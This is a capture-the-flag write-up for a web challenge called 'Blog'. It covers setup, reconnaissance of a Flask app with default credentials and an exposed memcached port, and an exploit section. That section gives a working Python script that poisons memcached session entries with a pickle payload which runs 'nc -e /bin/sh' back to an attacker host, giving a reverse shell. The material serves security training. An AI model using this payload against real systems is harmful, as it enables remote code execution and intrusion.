### Challenge Name : Blog
### Challenge Type : Web
### Challenge Diificulty : Hard

## Build
> docker build -t blog .

## Run
> docker run -it -d -p 9999:5000 -p 11211:11211 blog:latest

## Write Up
---
### Scanning

<img width="570" alt="CleanShot 2021-10-21 at 16 15 43" src="https://user-images.githubusercontent.com/49064045/138350489-a99d0896-c1e6-4b10-af0d-d3f87589a949.png">

### Observations

-   We see port 5000 running some default flask application.

-   Now it is clear that we are dealing with a webserver which is run on python.

-   Running directory buster tools we get `/login` page, and the webapp is using default credentials like `admin` and `admin` 

-   Now onto port 11211 which is a memcache service, which caches some stuff required by the application in the form of Key:Value pairs, so the webpage can kind of load faster.

### Exploit

-   So we use python to build a script, which will do the enumeration for us.

-   Bottom line being the exploit is basically, memcache stores serialized data, so it uses pickle.load() to unserialize it at the backend.
    
-   So we can send our payload in a serialized format and that should give us a reverse shell
    
-   First we have to enumerate the kind of stuff that gets stored in the memcache, We can list all the keys stored in memcache with the help of.
    
    -   [https://github.com/dlrust/python-memcached-stats](https://github.com/dlrust/python-memcached-stats)
-   So we develop the following script
    
    ```python
    import pylibmc
    from memcached_stats import MemcachedStats
    memcache = MemcachedStats(SERVER_IP,'11211')
    mc = pylibmc.Client([SERVER_IP], binary=True)
    def enumerate_keys():
        for i in memcache.keys():
            print "Key Value:", i
            print "Key Content:", mc.get(i), ""
    enumerate_keys()
    ```
    
-   Initially we get nothing  
    
    -   This is because there is nothing which is cached when the box spins up.
    -   So we visit port 5000, and then check this again.  
        
        ![image](https://user-images.githubusercontent.com/49064045/138350649-ff35aad7-5ec1-4c4d-b4ee-20d21c739763.png)
        
    -   So this means that the session token is being serialized and stored in the cache, so all we have to do is change this serialized payload to the serialized payload where we run system commands using python
-   This is how our final payload looks like.
    
    ```python
    import pylibmc
    from memcached_stats import MemcachedStats
    import subprocess
    import sys
    
    class rce(object):
        def __reduce__(self):
            return (subprocess.Popen, (('/bin/sh','-c','nc -e /bin/sh HOST_IP 80'),))
    
    memcache = MemcachedStats(SERVER_IP,'11211')
    mc = pylibmc.Client([SERVER_IP], binary=True)
    
    def keys_enum():
        for i in memcache.keys():
            print "Key Value:", i
            print "Key Content:", mc.get(i), ""
    
    def set_payload(payload):
        for i in memcache.keys():
            print i
            if "session" in i:
                print "Found a session key Sending Reverse shell payload"
                if mc.set(i, payload) is True:
                    print "Payload set successfully"
                else:
                    print "Error setting payload"
                    sys.exit()
    
    print "Initial Key value before epxloit"
    keys_enum()
    print "Exploiting"
    set_payload(rce())
    ```
    
-   We start our netcat listener and then run this script, Once the script completes execution, we just have to referesh the port 5000 webpage, and that is it, we should have a reverse shell  
    
-   We will get a shell as user `user` and with that we get the `flag` file
